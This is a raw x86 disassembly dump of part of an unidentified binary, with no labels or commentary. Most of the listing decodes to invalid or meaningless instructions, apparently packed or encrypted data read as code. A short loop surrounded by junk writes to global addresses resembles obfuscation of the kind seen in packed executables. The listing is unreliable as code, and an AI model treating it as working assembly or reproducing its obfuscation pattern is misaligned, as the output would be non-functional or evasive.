  414090:	or     BYTE PTR [ecx],0xe7
  414093:	xor    bl,BYTE PTR [eax]
  414095:	inc    ebp
  414096:	push   esp
  414097:	(bad)  
  414098:	xchg   edx,eax
  414099:	dec    esi
  41409a:	add    dh,ch
  41409c:	sahf   
  41409d:	ins    BYTE PTR es:[edi],dx
  41409e:	adc    edx,0x31
  4140a1:	dec    edx
  4140a2:	imul   ebx,DWORD PTR [esi+0x1a],0xffffffa7
  4140a6:	pop    edi
  4140a7:	mov    ch,0x46
  4140a9:	xchg   BYTE PTR [esi+0x3e2a77d5],dh
  4140af:	add    DWORD PTR [esp+ebp*4+0x54],ecx
  4140b3:	adc    ecx,edx
  4140b5:	cli    
  4140b6:	sub    BYTE PTR [edi],dh
  4140b8:	push   esp
  4140b9:	daa    
  4140ba:	out    dx,al
  4140bb:	out    dx,eax
  4140bc:	and    eax,0x5dc23430
  4140c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140c2:	hlt    
  4140c3:	sub    edx,DWORD PTR [eax+0x2a734e33]
  4140c9:	xchg   esp,eax
  4140ca:	push   ebx
  4140cb:	xchg   ecx,eax
  4140cc:	push   edx
  4140cd:	adc    cl,bl
  4140cf:	lods   eax,DWORD PTR ds:[esi]
  4140d0:	(bad)  
  4140d1:	push   ss
  4140d2:	sub    eax,0x8afb856
  4140d7:	push   ecx
  4140d8:	pop    es
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1-0x3d95c7a7],dl
  41419c:	inc    edx
  41419d:	ss jmp 0x83c3aa38
  4141a3:	out    0x60,eax
  4141a5:	add    DWORD PTR [ebx+0x5f5540b6],0xffffffa3
  4141ac:	in     al,dx
  4141ad:	pop    ss
  4141ae:	call   0x8a6d:0xc88c971c
  4141b5:	outs   dx,BYTE PTR ds:[esi]
  4141b6:	daa    
  4141b7:	push   ss
  4141b8:	mov    ecx,0x9acdf0f
  4141bd:	mov    eax,ds:0x5c361d33
  4141c2:	xchg   ebp,eax
  4141c3:	jb     0x414180
  4141c5:	aas    
  4141c6:	adc    eax,0x9d50ba34
  4141cb:	mov    DWORD PTR ds:0x9585d1fb,ebp
  4141d1:	xchg   edx,eax
  4141d2:	mov    ebp,DWORD PTR [edi]
  4141d4:	ds push cs
  4141d6:	scas   eax,DWORD PTR es:[edi]
  4141d7:	add    BYTE PTR [esi+edx*1+0x7c],bl
  4141db:	int3   
  4141dc:	jb     0x414165
  4141de:	popf   
  4141df:	outs   dx,DWORD PTR ds:[esi]
  4141e0:	mov    bh,0xb8
  4141e2:	mov    ah,0x7a
  4141e4:	xchg   ebx,eax
  4141e5:	or     bh,BYTE PTR [edi+edx*4+0x3]
  4141e9:	push   edi
  4141ea:	mov    bh,0xbd
  4141ec:	xlat   BYTE PTR ds:[ebx]
  4141ed:	cmc    
  4141ee:	mov    ebp,0x863e867e
  4141f3:	adc    dl,BYTE PTR [esi+0x2d]
  4141f6:	pop    ebp
  4141f7:	into   
  4141f8:	jecxz  0x41425a
  4141fa:	cli    
  4141fb:	dec    edi
  4141fc:	dec    edx
  4141fd:	jge    0x414234
  4141ff:	es push ss
  414201:	fiadd  DWORD PTR [edx-0x28]
  414204:	cmc    
  414205:	dec    ebp
  414206:	and    DWORD PTR [ebx+edx*2+0x3eb5b816],edi
  41420d:	cmp    ebx,DWORD PTR [esi]
  41420f:	xchg   edx,eax
  414210:	adc    cl,cl
  414212:	mov    dh,0x86
  414214:	push   0x47cd5cfd
  414219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41421a:	push   ss
  41421b:	adc    eax,0x7ff30dd5
  414220:	fistp  DWORD PTR ds:0x7dd037f2
  414226:	imul   esp,DWORD PTR [edx+ebp*4-0x7b8d504a],0x46
  41422e:	int    0x25
  414230:	push   0x2b
  414232:	das    
  414233:	mov    dh,0xbf
  414235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414236:	mov    ebx,0x981b8342
  41423b:	hlt    
  41423c:	lods   al,BYTE PTR ds:[esi]
  41423d:	jne    0x414218
  41423f:	mov    ah,0xf6
  414241:	jne    0x4142b0
  414243:	xchg   esp,eax
  414244:	test   al,0x65
  414246:	in     eax,0x70
  414248:	into   
  414249:	sbb    DWORD PTR [ebp+0x39],edi
  41424c:	pop    ecx
  41424d:	pop    edx
  41424e:	and    ebp,DWORD PTR [ecx]
  414250:	ins    DWORD PTR es:[edi],dx
  414251:	in     al,0x98
  414253:	lods   eax,DWORD PTR ds:[esi]
  414254:	cld    
  414255:	mov    eax,ds:0x20e77a15
  41425a:	xor    BYTE PTR [edx-0x32],dl
  41425d:	xor    ah,dl
  41425f:	lea    eax,[edx]
  414261:	mov    al,0xd9
  414263:	(bad)  
  414264:	xchg   ecx,eax
  414265:	xchg   esi,eax
  414266:	sbb    BYTE PTR [eax+0x5d569fbb],0x4f
  41426d:	mov    al,0x98
  41426f:	jecxz  0x414262
  414271:	int    0xec
  414273:	jns    0x4142ef
  414275:	ins    DWORD PTR es:[edi],dx
  414276:	mov    cl,0xce
  414278:	dec    edx
  41427a:	sbb    al,0x5d
  41427c:	ja     0x41427c
  41427e:	pop    ebx
  41427f:	adc    ch,ah
  414281:	mov    BYTE PTR [edx-0x4702002c],ah
  414287:	stc    
  414288:	sub    ch,BYTE PTR [esi-0xbfd43de]
  41428e:	mov    ebx,ebp
  414290:	retf   0x3e9b
  414293:	(bad)  
  414295:	mov    cl,0xa9
  414297:	mov    esi,DWORD PTR [edx-0x496abb]
  41429d:	and    BYTE PTR [edi-0x66],cl
  4142a0:	or     eax,0xfcc0cb3e
  4142a5:	loope  0x41426c
  4142a7:	mov    ah,0x21
  4142a9:	outs   dx,BYTE PTR ds:[esi]
  4142aa:	mov    bl,0x50
  4142ac:	mov    ebx,gs
  4142ae:	cmp    edx,eax
  4142b0:	dec    DWORD PTR [eax-0xe]
  4142b3:	jb     0x414280
  4142b5:	add    cl,cl
  4142b7:	imul   ebx,DWORD PTR [esi+0x4e],0xb47fda18
  4142be:	sub    DWORD PTR [esi],ecx
  4142c0:	scas   al,BYTE PTR es:[edi]
  4142c1:	cmp    eax,DWORD PTR [edi+0x72]
  4142c4:	fwait
  4142c5:	jecxz  0x4142e7
  4142c7:	in     eax,0x37
  4142c9:	imul   esp,DWORD PTR [ebp-0x7c],0x5a1458aa
  4142d0:	frstor [ecx]
  4142d2:	jmp    0x905e:0xf5ab9133
  4142d9:	dec    ecx
  4142da:	and    al,0xb6
  4142dc:	inc    eax
  4142dd:	retf   0x8418
  4142e0:	ss jge 0x4142f2
  4142e3:	in     eax,0xb
  4142e5:	mov    al,BYTE PTR [edx-0x15]
  4142e8:	std    
  4142e9:	jo     0x41431a
  4142eb:	in     eax,0x1
  4142ed:	mov    edi,0xe0e5e863
  4142f2:	cmp    eax,0xdef4fd2c
  4142f7:	jmp    0xa543:0x6e6fad68
  4142fe:	das    
  4142ff:	lahf   
  414300:	push   esi
  414301:	and    DWORD PTR [esp+ecx*2-0x6b],esi
  414305:	jns    0x4142c3
  414307:	popf   
  414308:	(bad)  
  41430a:	aam    0x40
  41430c:	xor    esi,esp
  41430e:	jl     0x41436c
  414310:	push   0xec01e449
  414315:	call   0x30ac:0xebbac718
  41431c:	pop    esp
  41431d:	ja     0x414328
  41431f:	xchg   esi,eax
  414320:	mov    eax,ds:0xcced22b
  414325:	ret    
  414326:	inc    ecx
  414327:	sbb    dh,BYTE PTR [edi+0x55]
  41432a:	cmp    esp,esi
  41432c:	mov    ch,0x62
  41432e:	add    DWORD PTR [eax+ebp*4-0x3531e046],ebx
  414335:	loope  0x4142b7
  414337:	loopne 0x414383
  414339:	dec    ebp
  41433a:	scas   al,BYTE PTR es:[edi]
  41433b:	fild   QWORD PTR [edi]
  41433d:	sbb    DWORD PTR [ebp+0x7738b980],0xd409d2d2
  414347:	iret   
  414348:	mov    cl,0x40
  41434a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41434b:	ss out 0x35,al
  41434e:	test   DWORD PTR [ebx+eiz*2],esi
  414351:	jle    0x414337
  414353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414354:	or     cl,BYTE PTR [ebp+0xc9cb607]
  41435a:	ds jp  0x41430f
  41435d:	nop
  41435e:	fisttp QWORD PTR [ecx-0x3eb327e0]
  414364:	fld    QWORD PTR [esi-0x7a0252cb]
  41436a:	adc    al,bh
  41436c:	int3   
  41436d:	sbb    DWORD PTR ds:0x83a8f3cc,esp
  414373:	rcr    dh,1
  414375:	xchg   BYTE PTR [ebx+0x20],dh
  414378:	sbb    DWORD PTR [esi+0x10],ecx
  41437b:	shl    DWORD PTR [edi+eiz*2],cl
  41437e:	(bad)  
  41437f:	mov    cl,0xe
  414381:	and    eax,0xbe46a050
  414386:	xor    ch,dh
  414388:	sbb    al,0xe7
  41438a:	mov    bl,0xa1
  41438c:	push   ss
  41438d:	mov    bh,BYTE PTR [edx]
  41438f:	push   ebx
  414390:	mov    ch,0x1b
  414392:	sbb    edx,eax
  414394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414395:	dec    eax
  414396:	cdq    
  414397:	rcr    BYTE PTR [ecx-0x571abd2f],1
  41439d:	sti    
  41439e:	sar    BYTE PTR [esi],cl
  4143a0:	jae    0x41436d
  4143a2:	xchg   esp,eax
  4143a3:	and    DWORD PTR [bx+0x35],edi
  4143a7:	jbe    0x414411
  4143a9:	dec    esp
  4143ab:	popf   
  4143ac:	jmp    0x98f4:0xd2208650
  4143b3:	in     al,0x6c
  4143b5:	push   ebp
  4143b6:	mov    WORD PTR [ecx+0x2a],fs
  4143b9:	adc    al,0x55
  4143bb:	gs mov esi,0x8e711f47
  4143c1:	mov    bh,0xc2
  4143c3:	add    DWORD PTR [edi+edx*2],ebx
  4143c6:	stos   BYTE PTR es:[edi],al
  4143c7:	mov    ?,WORD PTR [edx-0x36a76523]
  4143cd:	mov    ebp,0xca36b082
  4143d2:	mov    ds:0x3ac71d69,eax
  4143d7:	ficom  WORD PTR [ebp-0x3]
  4143da:	sahf   
  4143db:	ret    
  4143dc:	jp     0x4143b9
  4143de:	jb     0x41443e
  4143e0:	lods   al,BYTE PTR ds:[esi]
  4143e1:	nop
  4143e2:	mov    bl,0x4e
  4143e4:	xor    BYTE PTR [edi],bl
  4143e6:	xchg   BYTE PTR [eax-0x44],dl
  4143e9:	pop    ebx
  4143ea:	pop    esp
  4143eb:	cdq    
  4143ec:	lods   al,BYTE PTR ds:[esi]
  4143ed:	js     0x4143db
  4143ef:	jnp    0x414380
  4143f1:	repnz mov ds:0x4907eb9b,eax
  4143f7:	jb     0x4143a9
  4143f9:	or     esi,DWORD PTR [ebp+ebx*2+0x285b58aa]
  414400:	mov    al,0x4c
  414402:	adc    edi,esi
  414404:	into   
  414405:	outs   dx,BYTE PTR ds:[esi]
  414406:	dec    edi
  414407:	mov    edx,0x9073de8e
  41440c:	shl    BYTE PTR [ebx+0x6c],1
  41440f:	add    esp,DWORD PTR [ebp-0x3ef7205c]
  414415:	xchg   esi,eax
  414416:	and    DWORD PTR [edi+0xb75c7b6],0x28bca7d5
  414420:	adc    BYTE PTR [esi+edx*1],ch
  414423:	dec    eax
  414424:	jno    0x414425
  414426:	loop   0x41446d
  414428:	adc    al,0x5d
  41442a:	leave  
  41442b:	mov    eax,0x76196ff5
  414430:	retf   0xf3b1
  414433:	adc    eax,DWORD PTR [ebx-0x5b]
  414436:	xchg   esi,eax
  414437:	pop    edi
  414438:	lds    ebx,FWORD PTR [edi-0x73997a6]
  41443e:	data16 adc BYTE PTR [eax-0x120ba616],ch
  414445:	add    DWORD PTR [edx+eax*4-0x16d363ac],esi
  41444c:	(bad)  
  41444d:	aaa    
  41444e:	dec    esi
  41444f:	lock xor DWORD PTR [edx],0xa1797ad1
  414456:	add    ebx,edi
  414458:	push   ecx
  414459:	xchg   edi,eax
  41445a:	mov    ds:0xc8b9b769,eax
  41445f:	enter  0x61f4,0xd6
  414463:	imul   edx,DWORD PTR [ecx-0x5d],0xed632d5
  41446a:	sbb    ah,BYTE PTR [edx]
  41446c:	jne    0x4144ed
  41446e:	scas   al,BYTE PTR es:[edi]
  41446f:	pop    ds
  414470:	mov    al,ds:0xb1827a87
  414475:	daa    
  414476:	es aas 
  414478:	inc    edi
  414479:	inc    ebx
  41447a:	fdiv   st,st(6)
  41447c:	xchg   DWORD PTR [ebx-0x64],esi
  41447f:	push   edx
  414480:	mov    dl,0xdb
  414482:	or     eax,0x51c8d19a
  414487:	repnz pushf 
  414489:	icebp  
  41448a:	retf   0xcf61
  41448d:	int3   
  41448e:	sbb    BYTE PTR [ebx+0x25078d22],bh
  414494:	ja     0x4144d9
  414496:	push   ss
  414497:	call   0xd3d5:0xf52ae502
  41449e:	jo     0x4144ea
  4144a0:	or     dh,al
  4144a2:	xchg   ebx,eax
  4144a3:	sahf   
  4144a4:	and    eax,0x7b
  4144a7:	sbb    ebx,DWORD PTR [ebp-0x4b605d4d]
  4144ad:	hlt    
  4144ae:	inc    eax
  4144af:	push   edi
  4144b0:	add    edx,edx
  4144b2:	out    0xd0,al
  4144b4:	jmp    0x414467
  4144b6:	out    0x34,eax
  4144b8:	mov    bh,0x3a
  4144ba:	or     dh,BYTE PTR [edi+0x73]
  4144bd:	jne    0x414444
  4144bf:	push   eax
  4144c0:	mov    bl,0x3d
  4144c2:	popf   
  4144c3:	or     DWORD PTR [edi+0x57],esp
  4144c6:	mov    edx,0x23517a08
  4144cb:	add    eax,edx
  4144cd:	xor    al,0x7f
  4144cf:	mov    edx,0x560cf6b6
  4144d4:	test   eax,0xe0eb9dc3
  4144d9:	test   eax,ebx
  4144db:	retf   0x4f20
  4144de:	mov    WORD PTR [ebx],es
  4144e0:	(bad)  
  4144e1:	sub    ebp,DWORD PTR [edi]
  4144e3:	imul   ebx,edi,0x19286ed6
  4144e9:	mov    ebx,0x556efbf6
  4144ee:	mov    ds,eax
  4144f0:	mov    BYTE PTR [edx-0x1e5ef331],dl
  4144f6:	pop    ss
  4144f7:	push   0x42c387ec
  4144fc:	out    dx,al
  4144fd:	adc    eax,0xd2b7ca6e
  414502:	mov    dh,0x96
  414504:	xchg   ecx,eax
  414505:	sub    eax,0x659e511a
  41450a:	pop    ds
  41450b:	and    ebx,DWORD PTR [esi+0x38a2d976]
  414511:	dec    edx
  414512:	and    ecx,DWORD PTR [edi]
  414514:	ret    0xf637
  414517:	ret    
  414518:	jb     0x4144d3
  41451a:	push   ecx
  41451b:	mov    DWORD PTR [ebx+0x27],0x93baeb9d
  414522:	sahf   
  414523:	pushf  
  414524:	es push esi
  414526:	mov    edi,0xf313af54
  41452b:	test   al,0xdd
  41452d:	imul   BYTE PTR [eax]
  41452f:	shl    BYTE PTR [ebp+ebp*1-0x6d],0xdc
  414534:	pop    ds
  414535:	ret    0x7cea
  414538:	fst    st(5)
  41453a:	mov    ?,WORD PTR [eax]
  41453c:	loopne 0x4144e2
  41453e:	sti    
  41453f:	nop
  414540:	jl     0x414551
  414542:	div    edx
  414544:	das    
  414545:	xchg   esi,eax
  414546:	aam    0x71
  414548:	inc    esi
  414549:	mov    eax,0xb48d1ae9
  41454e:	(bad)  
  41454f:	repnz and ah,dh
  414552:	(bad)  
  414553:	lds    esp,FWORD PTR [ecx+0x8]
  414556:	in     al,dx
  414557:	xor    ebp,DWORD PTR [esi-0x74195239]
  41455d:	jo     0x4145b1
  41455f:	mov    WORD PTR [edx+0xe9c6d71],ds
  414565:	fdivp  st(3),st
  414567:	xor    al,0x4f
  414569:	cmp    ecx,DWORD PTR [ebx+0x17]
  41456c:	mov    dl,0xbf
  41456e:	cli    
  41456f:	jnp    0x4145c3
  414571:	aam    0x8
  414573:	mov    ds,WORD PTR [eax]
  414575:	adc    cl,BYTE PTR [ebx]
  414577:	mov    eax,ebp
  414579:	or     eax,0xaffc1192
  41457e:	shr    cl,cl
  414580:	aaa    
  414581:	retf   0x5ec
  414584:	neg    DWORD PTR [edi-0x642596f7]
  41458a:	loopne 0x41454f
  41458c:	sbb    DWORD PTR [eax],0x76289b1c
  414592:	inc    edx
  414593:	xor    al,ch
  414595:	and    BYTE PTR [eax+0x6d],0x94
  414599:	call   0xa596:0x773ef1b4
  4145a0:	bound  ebp,QWORD PTR [edi+0x41]
  4145a3:	inc    ebp
  4145a4:	pop    eax
  4145a5:	sub    edx,DWORD PTR [ecx-0x3a]
  4145a8:	or     eax,DWORD PTR [edx*4+0x2ebbec34]
  4145af:	int    0x2d
  4145b1:	dec    ecx
  4145b2:	sbb    dl,BYTE PTR [eax]
  4145b4:	inc    ebx
  4145b5:	and    edi,esp
  4145b7:	in     eax,0xb7
  4145b9:	xchg   esp,eax
  4145ba:	cli    
  4145bb:	sub    DWORD PTR [esi+eax*1+0x5ae37300],eax
  4145c2:	xchg   esi,eax
  4145c3:	xchg   ecx,eax
  4145c4:	pop    esi
  4145c5:	push   edx
  4145c6:	loop   0x414603
  4145c8:	outs   dx,DWORD PTR ds:[esi]
  4145c9:	lea    edx,[edx+0x49134b63]
  4145cf:	in     al,dx
  4145d0:	addr16 push cs
  4145d2:	xor    al,0x72
  4145d4:	jl     0x414609
  4145d6:	xor    ch,BYTE PTR [esi]
  4145d8:	xor    cl,dl
  4145da:	mov    edx,0x765b50df
  4145df:	jno    0x414658
  4145e1:	imul   BYTE PTR [eax-0x1758ad91]
  4145e7:	std    
  4145e8:	fisttp DWORD PTR [eax]
  4145ea:	outs   dx,BYTE PTR ds:[esi]
  4145eb:	call   FWORD PTR [ecx-0x78]
  4145ee:	aas    
  4145ef:	cmp    eax,0x26655296
  4145f4:	ds adc bl,dl
  4145f7:	inc    esp
  4145f8:	push   esp
  4145f9:	rcr    BYTE PTR [esi-0x24],0x40
  4145fd:	cli    
  4145fe:	fistp  DWORD PTR [edx+eiz*4]
  414601:	nop
  414602:	and    al,0x44
  414604:	mov    ds:0xf059ccda,eax
  414609:	fnstsw WORD PTR [eax]
  41460b:	je     0x4145a4
  41460d:	mov    cl,0xc2
  41460f:	pop    ebp
  414610:	inc    ebx
  414611:	dec    edx
  414612:	shr    DWORD PTR [ebx-0x164a2d0c],cl
  414618:	xchg   ecx,eax
  414619:	dec    edx
  41461a:	pop    ecx
  41461b:	push   ecx
  41461c:	jl     0x414669
  41461e:	mov    bh,0x81
  414620:	imul   edi,DWORD PTR [esi+0x5a],0x82f504ed
  414627:	ss pop ds
  414629:	test   DWORD PTR [ecx+0x30a5184f],ebp
  41462f:	outs   dx,BYTE PTR ds:[esi]
  414630:	test   ah,bh
  414632:	push   0x176c0ca9
  414637:	add    cl,cl
  414639:	push   ss
  41463a:	gs ret 
  41463c:	inc    edi
  41463d:	scas   al,BYTE PTR es:[edi]
  41463e:	mov    ecx,0x8009bdce
  414643:	dec    ebx
  414644:	jno    0x4145eb
  414646:	mov    ch,0x5e
  414648:	and    eax,0xe18b05e0
  41464d:	mul    BYTE PTR [ecx-0x2a]
  414650:	gs imul eax,edx,0xffffffb5
  414654:	jg     0x4146bd
  414656:	mov    BYTE PTR [ebx+0x711d1379],dh
  41465c:	mov    esi,0x5f209a7c
  414661:	or     dl,BYTE PTR es:[ebx-0x4f]
  414665:	shl    BYTE PTR [edx+0x7263c444],1
  41466b:	hlt    
  41466c:	les    esp,FWORD PTR [esp+esi*2]
  41466f:	mov    eax,0x9304c56f
  414674:	cld    
  414675:	out    dx,al
  414676:	outs   dx,BYTE PTR ds:[esi]
  414677:	or     DWORD PTR [esi-0x95c30bf],0xed6b7d95
  414681:	pop    eax
  414682:	jmp    0x4146fc
  414684:	pop    ecx
  414685:	cwde   
  414686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414687:	and    DWORD PTR [edx+0x36],0xffffff9e
  41468b:	lock je 0x4146d1
  41468e:	je     0x414630
  414690:	or     ebp,DWORD PTR [edi-0x4]
  414693:	sub    BYTE PTR [esi-0x35],ch
  414696:	stos   DWORD PTR es:[edi],eax
  414697:	adc    al,0x8
  414699:	js     0x414660
  41469b:	(bad)  
  41469c:	inc    DWORD PTR [eax]
  41469e:	imul   ax,cx,0x3740
  4146a3:	fsub   st(5),st
  4146a5:	dec    ebx
  4146a6:	sbb    DWORD PTR ds:0xce362245,edi
  4146ac:	into   
  4146ad:	cs pop es
  4146af:	das    
  4146b0:	xlat   BYTE PTR ds:[ebx]
  4146b1:	push   esi
  4146b2:	cld    
  4146b3:	jecxz  0x414672
  4146b5:	pushf  
  4146b6:	mul    DWORD PTR [ecx-0x5197e48b]
  4146bc:	adc    al,cl
  4146be:	push   edi
  4146bf:	imul   ecx,DWORD PTR [ebx+0x53],0x59
  4146c3:	sbb    edx,ebx
  4146c5:	add    BYTE PTR [ebx],0x81
  4146c8:	add    dh,BYTE PTR [eax+0x59bb3897]
  4146ce:	mov    ch,0x98
  4146d0:	mov    al,0x8f
  4146d2:	push   ecx
  4146d3:	push   0xae01bdfc
  4146d8:	inc    esp
  4146d9:	jle    0x41471c
  4146db:	out    0x3e,eax
  4146dd:	and    DWORD PTR [ecx+0x64133a6f],esi
  4146e3:	jns    0x4146e1
  4146e5:	pusha  
  4146e6:	les    eax,FWORD PTR [edi-0x5b]
  4146e9:	sbb    cl,dl
  4146eb:	mov    ds,WORD PTR [esi-0x35aa3f8d]
  4146f1:	pusha  
  4146f2:	jnp    0x4146e4
  4146f4:	jbe    0x4146bb
  4146f6:	add    bl,BYTE PTR [edx-0x17d6cff]
  4146fc:	mov    eax,0xbb31cf6a
  414701:	jp     0x4146eb
  414703:	stos   BYTE PTR es:[edi],al
  414704:	add    DWORD PTR [ecx],edi
  414706:	sub    al,0xb4
  414708:	js     0x4146b7
  41470a:	lea    esp,[eax]
  41470c:	sbb    BYTE PTR [ebx+0x51],dh
  41470f:	hlt    
  414710:	imul   ebp,DWORD PTR [eax-0x7e],0x4863561a
  414717:	retf   
  414718:	int    0x57
  41471a:	scas   eax,DWORD PTR es:[edi]
  41471b:	iret   
  41471c:	jns    0x4146fb
  41471e:	std    
  41471f:	retf   0xe575
  414722:	fnstsw WORD PTR [ebx+0x7617ac3d]
  414728:	jmp    0x71cd5184
  41472d:	dec    edx
  41472e:	fwait
  41472f:	imul   ebp,esi,0x4f
  414732:	cmp    eax,0x555ca8e3
  414737:	and    ah,BYTE PTR [esi+0x33]
  41473a:	lods   al,BYTE PTR ds:[esi]
  41473b:	dec    esp
  41473c:	mov    dh,0x6
  41473e:	push   es
  41473f:	inc    edx
  414740:	or     DWORD PTR [esi],esi
  414742:	jno    0x41472e
  414744:	mov    WORD PTR [edx],?
  414746:	shl    al,0x3
  414749:	mov    BYTE PTR [edi-0x3bb9ce05],0x74
  414750:	add    al,BYTE PTR [ecx-0x17]
  414753:	pop    esp
  414754:	xchg   BYTE PTR [ebx-0x19],ah
  414757:	adc    ebx,esp
  414759:	stos   DWORD PTR es:[edi],eax
  41475a:	cmp    al,0x7
  41475c:	or     eax,esi
  41475e:	dec    esi
  41475f:	arpl   di,dx
  414761:	adc    BYTE PTR ds:0xc185fadc,al
  414767:	cmp    ecx,DWORD PTR [ecx+0x6a429b1c]
  41476d:	xor    bh,dh
  41476f:	pop    eax
  414770:	ds pop ebx
  414772:	gs popa 
  414774:	mov    bl,0x5f
  414776:	jl     0x41478e
  414778:	push   ecx
  414779:	mov    ebx,0xbe26dcf
  41477e:	clc    
  41477f:	push   esp
  414780:	push   0xffffff96
  414782:	loopne 0x41479e
  414784:	stos   DWORD PTR es:[edi],eax
  414785:	popf   
  414786:	mov    ds:0x14ccf89d,eax
  41478b:	clc    
  41478c:	call   0xf09f:0xfb7ebab7
  414793:	push   edi
  414794:	pop    ss
  414795:	or     cl,BYTE PTR [ecx]
  414797:	jg     0x4147ad
  414799:	cmp    ah,dh
  41479b:	jnp    0x4147db
  41479d:	jg     0x4147aa
  41479f:	arpl   WORD PTR [eax+0x404c2234],di
  4147a5:	mov    ebp,0x397598cc
  4147aa:	cmp    ah,BYTE PTR [ebp+0x46969984]
  4147b0:	pop    ebx
  4147b1:	inc    edi
  4147b2:	push   eax
  4147b3:	xor    ah,bh
  4147b5:	cmp    BYTE PTR [ebx],cl
  4147b7:	pop    edi
  4147b8:	repnz (bad) 
  4147ba:	sbb    al,bl
  4147bc:	jecxz  0x41475e
  4147be:	cli    
  4147bf:	imul   edx,DWORD PTR [esi-0x51],0xffffff91
  4147c3:	mov    cl,0x39
  4147c5:	aam    0x35
  4147c7:	mov    BYTE PTR [ebx+ebx*1],ch
  4147ca:	fsubp  st(2),st
  4147cc:	and    al,0x7c
  4147ce:	xor    DWORD PTR [ebx],esp
  4147d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d1:	nop
  4147d2:	dec    esi
  4147d3:	pop    esp
  4147d4:	and    DWORD PTR [edi-0x446e9f5e],0x4141a1aa
  4147de:	pop    ebx
  4147df:	js     0x414761
  4147e1:	xor    bh,BYTE PTR [eax+0xc]
  4147e4:	add    BYTE PTR [esi],0x5c
  4147e7:	jne    0x414857
  4147e9:	jmp    0x2b9e21f9
  4147ee:	ror    BYTE PTR [esp+edx*2-0x77c86622],1
  4147f5:	cld    
  4147f6:	xchg   edx,eax
  4147f7:	and    al,0x3d
  4147f9:	test   DWORD PTR [esi+0x77],eax
  4147fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147fd:	ja     0x414828
  4147ff:	cmp    DWORD PTR [esi-0x60],edi
  414802:	rcl    DWORD PTR [esi+0x56e35e78],0x8b
  414809:	rcr    DWORD PTR [ecx+0x65],cl
  41480c:	aas    
  41480d:	into   
  41480e:	xor    DWORD PTR [ecx+0x6b47e488],eax
  414814:	mov    ebp,0x83940694
  414819:	xlat   BYTE PTR ds:[ebx]
  41481a:	pop    es
  41481b:	mov    dl,0xba
  41481d:	mov    ecx,DWORD PTR [bp+si]
  414820:	xchg   edx,eax
  414821:	mov    ecx,0x8bce83f1
  414826:	jle    0x4148a6
  414828:	and    ebp,esi
  41482a:	arpl   dx,bx
  41482c:	rol    DWORD PTR [ecx+0x69],0x76
  414830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414831:	popa   
  414832:	and    bh,cl
  414834:	pop    eax
  414835:	push   cs
  414836:	sbb    dh,BYTE PTR [eax+0x78]
  414839:	jnp    0x4148ab
  41483b:	push   ss
  41483c:	sbb    al,0x46
  41483e:	shl    edx,1
  414840:	xlat   BYTE PTR ds:[ebx]
  414841:	daa    
  414842:	pop    esp
  414843:	mov    edi,0x9a764555
  414848:	cmc    
  414849:	pop    ecx
  41484a:	addr16 sub al,0xfa
  41484d:	(bad)  
  41484e:	sar    DWORD PTR [edi+0x2132bf4f],0x23
  414855:	pop    es
  414856:	call   0xf3eefd43
  41485b:	xlat   BYTE PTR ds:[ebx]
  41485c:	retf   
  41485d:	pop    es
  41485e:	mov    esp,0xe848917c
  414863:	fisubr DWORD PTR [edx-0xfd42a47]
  414869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41486a:	popa   
  41486b:	sbb    DWORD PTR [eax],esi
  41486d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41486e:	hlt    
  41486f:	and    ah,BYTE PTR [ebx-0x6762670c]
  414875:	rep stos BYTE PTR es:[edi],al
  414877:	or     eax,0xc38c49a3
  41487c:	cdq    
  41487d:	les    edx,FWORD PTR [edi+0xf95e5cd]
  414883:	cs daa 
  414885:	sar    DWORD PTR [edx-0x5b],0xfe
  414889:	fcmovu st,st(6)
  41488b:	je     0x414842
  41488d:	mov    dl,0xf2
  41488f:	push   ecx
  414890:	xor    BYTE PTR ds:0x27cd43ec,bh
  414896:	std    
  414897:	into   
  414898:	sub    al,BYTE PTR ds:0xb89e81bc
  41489e:	retf   0x1b5e
  4148a1:	adc    esi,edx
  4148a3:	jecxz  0x414910
  4148a5:	push   ss
  4148a6:	add    al,0xc9
  4148a8:	out    0x52,al
  4148aa:	mov    ds:0xd8688e9b,eax
  4148af:	lahf   
  4148b0:	or     al,0xec
  4148b2:	loop   0x4148e7
  4148b4:	xchg   edx,esp
